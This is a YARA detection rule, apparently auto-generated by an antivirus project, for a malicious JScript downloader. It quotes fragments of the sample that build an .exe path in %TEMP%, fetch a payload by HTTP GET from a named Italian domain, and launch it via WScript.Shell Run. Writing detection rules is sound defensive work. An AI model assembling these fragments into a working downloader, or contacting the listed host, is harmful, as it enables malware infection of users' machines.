rule sig_20160329_7952784423cc698e711b3d070643afdc {
  meta:
    description = "datamaliciousorder - file 20160329_7952784423cc698e711b3d070643afdc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cfb222c699c73d9863b1c89ea9b13a6894ec49456a8c6e05e050abd19bda00b7"

  strings:
    $s1  = "function F() {return y0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"oXcguMG8ewhLXZHF.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[z](y() * 11); if (vL[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function An(yO, eW){I = I * 1; return yO - eW;};" fullword ascii
    $s4  = "vL[JZ](\"GET\", \"http://pasticceriabonci.it/m1psa\", false);" fullword ascii
    $s5  = "var y0 = function Ho() {return WScript[pe](\"WScript.Shell\");}(), h = 11;" fullword ascii
    $s6  = "function Y(){return \"\" + kx;};" fullword ascii
    $s7  = "function T() {return ((k == true) && (k == cd)) ? 1 : I;};" fullword ascii
    $s8  = "function d(hv){y0[\"Run\"](hv, I, I);};" fullword ascii
    $s9  = "function y(){return 22;};" fullword ascii
    $s10 = "function en()" fullword ascii
    $s11 = "var AQ = new this[\"Date\"]();" fullword ascii
    $s12 = "function Gy(D) {var X = (1, 2, 3, 4, 5, D); return X;};" fullword ascii
    $s13 = "function x(){return pe;};" fullword ascii
    $s14 = " while (oD){" fullword ascii
    $s15 = "return An(Vs, qu);" fullword ascii
    $s16 = "var k = false;" fullword ascii
    $s17 = "k = true; " fullword ascii
    $s18 = "var WF = false;" fullword ascii
    $s19 = "var cd = false;" fullword ascii
    $s20 = "cd = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}